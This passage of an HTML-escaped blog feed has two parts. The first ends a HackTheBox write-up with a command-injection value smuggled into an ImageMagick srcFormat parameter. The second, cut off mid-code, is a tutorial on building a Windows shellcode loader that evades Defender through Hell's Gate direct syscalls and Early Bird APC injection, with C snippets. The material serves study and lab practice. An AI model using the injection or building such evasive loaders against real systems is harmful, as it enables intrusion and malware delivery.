&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">occurrence&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>For this purpose the &lt;code>srcFormat&lt;/code> option will work, especially because it is the argument that is inserted right before the output file name.
At this point I realized that I probably don&amp;rsquo;t have to use the built in vulnerability in the &lt;code>Imagemagick&lt;/code> module, and could probably just use the command injection I have here to spawn a shell or use &lt;code>mv&lt;/code> to copy the flag to the output directory, but the &lt;code>convert&lt;/code> tool has a &lt;code>-write&lt;/code> option that just simplifies everything so that is the reason I ended up not using a more sophisticated command injection payload.
Anyways, we will insert the following into the &lt;code>srcFormat&lt;/code> parameter:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">png:- -write uploads/flag &lt;span class="p">;&lt;/span> &lt;span class="nb">echo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The space after &lt;code>flag&lt;/code> and the &lt;code>; echo &lt;/code> are important in order to break up the original command and prevent any errors from breaking our injection.
The final command thats runs server side would be:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">convert &amp;lt;args&amp;gt; png:- -write uploads/flag &lt;span class="p">;&lt;/span> &lt;span class="nb">echo&lt;/span> AVIF:file_name
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/2.PNG"
width="649"
height="587"
srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/2_hu65ccfe9683161db203d90f1b030012d5_77965_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/2_hu65ccfe9683161db203d90f1b030012d5_77965_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Inserting our new parameter on the POST request"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="265px"
>&lt;/p>
&lt;p>Then we can download the flag, and use &lt;code>exiftool -b&lt;/code> to extract the flag from the image :).&lt;/p></description></item><item><title>Windows Shellcode Loader in C</title><link>https://Kvn11.github.io/p/windows-shellcode-loader-in-c/</link><pubDate>Fri, 20 Oct 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/windows-shellcode-loader-in-c/</guid><description>&lt;img src="https://Kvn11.github.io/p/windows-shellcode-loader-in-c/img/cover.png" alt="Featured image of post Windows Shellcode Loader in C" />&lt;h2 id="opening-thoughts">Opening Thoughts
&lt;/h2>&lt;p>Over the past couple months I have gone through the Zero2Automated malware RE course, and the Malware Development course from MalDev Academy.
The malware RE course is pretty easy to practice as there are plenty of samples and challenges online to reverse, but finding a challenge for malware development is a bit trickier.
Fortunately, I ran into some problems while studying for the OSCP exam and doing HackTheBox.
Many of the boxes running Windows 10 were able to detect &lt;code>msfvenom&lt;/code>, mimikatz, and other malicous powershell scripts which made it very difficult to get a reverse shell on what should have been very simple boxes.
The OSCP teaches to use &lt;code>Shellter&lt;/code>, but even this tool was failing to bypass Defender.
At this point I figured it&amp;rsquo;d be a good investment to build my own loader so that I wouldn&amp;rsquo;t ever have to worry about this issue again.
I had actually done this project once in C++, but hindsight is 20/20 and I arrived at the conclusion that writing it in C is the best option.
My reasoning is that a loader isn&amp;rsquo;t super complicated, so the organization and object oriented approach that C++ offers doesn&amp;rsquo;t really offer any benefit.
And the added overhead from C++ just makes the final executable larger.
Since I&amp;rsquo;ll be working on boxes where the network bandwidth isn&amp;rsquo;t great, a small and portable executable is better.&lt;/p>
&lt;h2 id="design">Design
&lt;/h2>&lt;p>I was talking to this one person who&amp;rsquo;s been developing game cheats for over 10 years and he told me that all you really need is memory injection and streaming relocations.
Streaming relocations is a bit overkill for this project, so I&amp;rsquo;ll skip that but the injection is definitely optimal.
In the first version I had used APC injection, and ran into issues with my shell dying once the original process terminated.
I&amp;rsquo;m sure I could fix it, but since this is supposed to be an improvement over my &lt;code>1.0&lt;/code> loader I want to go with remote APC injection, aka Early Bird APC injection.
I will also need a quick and easy way of hashing strings, and encrypting my &lt;code>msfvenom&lt;/code> payloads.
For these requirments I&amp;rsquo;ll just use the same code snippets as taught in the MalDev course since crypto isn&amp;rsquo;t one of my strengths.&lt;/p>
&lt;h2 id="hells-gate">Hell&amp;rsquo;s Gate
&lt;/h2>&lt;p>Window&amp;rsquo;s syscall&amp;rsquo;s are the API&amp;rsquo;s that carry out the actions when a WinAPI is called.
The example given in the course is that &lt;code>VirtualAlloc&lt;/code> and &lt;code>VirtualAllocEx&lt;/code> use the &lt;code>NtAllocateVirtualMemory&lt;/code> to carry out their actions.
All the syscalls return an &lt;code>NTSTATUS&lt;/code> value that indicates an error code.
We can use the following docs since most syscalls aren&amp;rsquo;t documented by Microsoft:&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://web.archive.org/web/20230401045934/http://undocumented.ntinternals.net/" target="_blank" rel="noopener"
>Undocumented NTInternals&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html" target="_blank" rel="noopener"
>ReactOS&amp;rsquo;s NTDLL Reference&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>The main advantage to using syscalls is that we can evade hooked WinAPI.
Syscalls will have the following structure:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">mov&lt;/span> &lt;span class="no">r10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">rcx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">SSN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">syscall&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>SSN referes to the syscall service number that the kernel uses to distinguish one syscall from another.
It&amp;rsquo;s important to note that these values will differ for the same syscall across different OS and OS versions.&lt;/p>
&lt;p>Hell&amp;rsquo;s Gate is a technique that can read through &lt;code>ntdll.dll&lt;/code> to find and execute syscalls.
It&amp;rsquo;s a pretty complex technique that I won&amp;rsquo;t go over here since that isn&amp;rsquo;t the purpose of this post.
But you can read about it &lt;a class="link" href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf" target="_blank" rel="noopener"
>here&lt;/a>.
We can follow the guidance in that paper to get the technique working.
Long story short, we will add a &lt;code>VX_TABLE_ENTRY&lt;/code> to our &lt;code>VX_TABLE&lt;/code> for every syscall we want to use:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_VX_TABLE_ENTRY&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">pAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">dwHash&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">WORD&lt;/span> &lt;span class="n">wSystemCall&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">VX_TABLE_ENTRY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">PVX_TABLE_ENTRY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_VX_TABLE&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">VX_TABLE_ENTRY&lt;/span> &lt;span class="n">NtCreateUserProcess&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">VX_TABLE_ENTRY&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">some_syscall&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This table will be populated via the &lt;code>GetVxTableEntry(...)&lt;/code> function given in the paper.&lt;/p>
&lt;p>Then &lt;code>HellsGate&lt;/code> function just loads up the correct SSN to be called, and then &lt;code>HellDescent&lt;/code> actually makes the call:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellsGate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g_Sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NtSyscallEntry&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">wSystemCall&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellDescent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arg1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">arg2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">arg3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">...);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="early-bird-apc-injection">Early Bird APC Injection
&lt;/h2>&lt;p>&lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank" rel="noopener"
>Asynchronous Procedure Calls&lt;/a> (APC&amp;rsquo;s) are functions that execute async in the context of a specific thread.
We can queue an APC to a thread, and the next time the thread is scheduled, it will run the APC function.
In order to run an APC generated by an application, the thread we use must be in an alertable state, which just means that it is in a &amp;ldquo;wait&amp;rdquo; state.
The early bird part of this technique just refers to a remote process instead of the local one.
So we would do the following:&lt;/p>
&lt;ol>
&lt;li>Spawn process in suspended state.&lt;/li>
&lt;li>Write payload to address space of suspended process.&lt;/li>
&lt;li>Get a handle to the suspended thread.&lt;/li>
&lt;li>Pass in address of payload new address, and handle to &lt;code>QueueUserAPC&lt;/code>.&lt;/li>
&lt;li>Resume thread and wait for payload to run.&lt;/li>
&lt;/ol>
&lt;p>Something interesting to note is that normally you&amp;rsquo;d spawn the process like this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">BOOL&lt;/span> &lt;span class="nf">CreateProcessA&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPCSTR&lt;/span> &lt;span class="n">lpApplicationName&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSTR&lt;/span> &lt;span class="n">lpCommandLine&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSECURITY_ATTRIBUTES&lt;/span> &lt;span class="n">lpProcessAttributes&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSECURITY_ATTRIBUTES&lt;/span> &lt;span class="n">lpThreadAttributes&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BOOL&lt;/span> &lt;span class="n">bInheritHandles&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">dwCreationFlags&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPVOID&lt;/span> &lt;span class="n">lpEnvironment&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPCSTR&lt;/span> &lt;span class="n">lpCurrentDirectory&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSTARTUPINFOA&lt;/span> &lt;span class="n">lpStartupInfo&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPPROCESS_INFORMATION&lt;/span> &lt;span class="n">lpProcessInformation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">CreateProcessA&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lpPath&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DEBUG_PROCESS&lt;/span> &lt;span class="c1">// dwCreationFlags,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">StartupInfo&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ProcInfo&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>However I am using the syscall &lt;code>NtCreateUserProcess&lt;/code>, so I need to use a slightly different calling convention.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 &lt;/span>&lt;span class="c1">// NtCreateUserProcess &amp;amp; NtCreateThreadEx
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellsGate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g_Sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NtCreateUserProcess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">wSystemCall&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellDescent&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hProcess&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hThread&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PROCESS_ALL_ACCESS&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THREAD_CREATE_FLAGS_CREATE_SUSPENDED&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">UppProcessParameters&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">psCreateInfo&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pAttributeList&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>To learn more about how &lt;code>NtCreateUserProcess&lt;/code> works I recommend this &lt;a class="link" href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="noopener"
>blog&lt;/a>.&lt;/p>
&lt;p>Now we just write our payload into the memory space of this process.
For this, we need to update our syscall table structure with 3 more syscalls:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fnNtAllocateVirtualMemory&lt;/span>&lt;span class="p">)(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ProcessHandle&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">BaseAddress&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG_PTR&lt;/span> &lt;span class="n">ZeroBits&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PSIZE_T&lt;/span> &lt;span class="n">RegionSize&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">AllocationType&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">Protect&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fnNtProtectVirtualMemory&lt;/span>&lt;span class="p">)(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ProcessHandle&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">BaseAddress&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PULONG&lt;/span> &lt;span class="n">NumberOfBytesToProtect&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">NewAccessProtection&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PULONG&lt;/span> &lt;span class="n">OldAccesProtection&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fnNtWriteVirtualMemory&lt;/span>&lt;span class="p">)(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ProcessHandle&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">BaseAddress&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Buffer&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">NumberOfBytesToWrite&lt;/span>&lt;span class="p">,&lt;/span>
